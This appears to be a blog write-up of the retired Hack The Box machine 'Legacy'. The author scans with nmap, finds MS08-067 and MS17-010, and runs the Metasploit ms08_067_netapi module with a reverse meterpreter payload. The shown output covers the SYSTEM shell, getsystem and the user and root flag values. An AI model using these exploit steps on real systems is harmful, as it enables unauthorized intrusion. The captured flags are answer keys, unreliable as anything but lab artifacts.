@@ -1,0 +1,160 @@
+I"!2<p>Legacy is an easy level retired capture the flag machine from Hack the Box. This writeup will describe the techniques I used to bypass security controls and gain root access to the machine.</p>
+
+<h2 id="getting-started">Getting Started</h2>
+<p>The first thing i did was conduct a basic <kbd>nmap</kbd> scan to search for the top 200 open ports on the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/legacy]
+└─<span class="nv">$ </span>nmap <span class="nt">--top-ports</span> 200 <span class="nt">-Pn</span> 10.10.10.4
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-07 14:50 EST
+Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up <span class="o">(</span>0.023s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 197 filtered ports
+PORT     STATE  SERVICE
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+3389/tcp closed ms-wbt-server
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>2.57 seconds
+                                                                                                                                                          
+</code></pre></div></div>
+
+<p>The scan shows there are at least 2 open ports with services such as netbios and microsoft-ds running. Next, to get a better understanding of the services and version running, and to scan for basic vulnerabilities, I used the <kbd>nmapAutomator</kbd> script.  The below output only shows the most relevant information.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---------------------Starting</span> Nmap Vulns Scan---------------------
+                                                                                                          
+Running CVE scan on basic ports
+                                                                                                          
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-07 15:00 EST
+Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up <span class="o">(</span>0.023s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE      VERSION
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.03 seconds
+
+
+Running Vuln scan on basic ports
+                                                                                                          
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-07 15:00 EST
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS <span class="o">(</span>CVE-2011-1002<span class="o">)</span><span class="nb">.</span>
+|_  Hosts are all up <span class="o">(</span>not vulnerable<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>10.10.10.4
+Host is up <span class="o">(</span>0.021s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE      VERSION
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service <span class="k">in </span>Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure <span class="nb">date</span>: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_smb-vuln-ms10-054: <span class="nb">false</span>
+|_smb-vuln-ms10-061: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk <span class="nb">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>54.12 seconds
+</code></pre></div></div>
+
+<p>The scan shows the target is likely vulnerable to CVE-2008-4250, a serious vulnerability also referred to by its <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">microsoft bulletin</a> identifier, Microsoft Windows Server 2000/2003 - Code Execution (MS08-067). There is a public exploit for this vulnerability on metasploit (exploit/windows/smb/ms08_067_netapi), so next i started up the <kbd>msfconsole</kbd> and configured the necessary options.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS   10.10.10.4       <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPORT    445              <span class="nb">yes       </span>The SMB service port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBPIPE  BROWSER          <span class="nb">yes       </span>The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+
+
+Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     10.10.14.3       <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Targeting
+
+
+msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p>Executing the exploit started a reverse meterpreter session on the target. Using the <kbd>getsystem</kbd> meterpreter command, I upgraded my privilege to SYSTEM. At this point I can start looking for the user and root flags.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.3:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Automatically detecting the target...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Attempting to trigger the vulnerability...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175174 bytes<span class="o">)</span> to 10.10.10.4
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.3:4444 -&gt; 10.10.10.4:1028<span class="o">)</span> at 2021-01-11 10:22:35 <span class="nt">-0500</span>
+
+meterpreter <span class="o">&gt;</span> getsystem
+...got system via technique 1 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>In Memory/Admin<span class="o">))</span><span class="nb">.</span>
+meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p>I used the <kbd>search</kbd> meterpreter command and found both flags.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> search <span class="nt">-f</span> <span class="k">*</span>user.txt<span class="k">*</span>
+Found 1 result...
+    c:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt <span class="o">(</span>32 bytes<span class="o">)</span>
+meterpreter <span class="o">&gt;</span> <span class="nb">cat</span> <span class="s2">"c:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\j</span><span class="s2">ohn</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+e69af0e4f443de7e36876fda4ec7644fmeterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> search <span class="nt">-f</span> <span class="k">*</span>root.txt<span class="k">*</span>
+Found 1 result...
+    c:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt <span class="o">(</span>32 bytes<span class="o">)</span>
+meterpreter <span class="o">&gt;</span> <span class="nb">cat</span> <span class="s2">"c:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
+993442d258b0e0ec917cae9e695d5713meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+<h2 id="conclusion">Conclusion</h2>
+<p>Overall this was an easy CTF machine that was vulnerable to a very popular windows exploit.</p>
+
+:ET
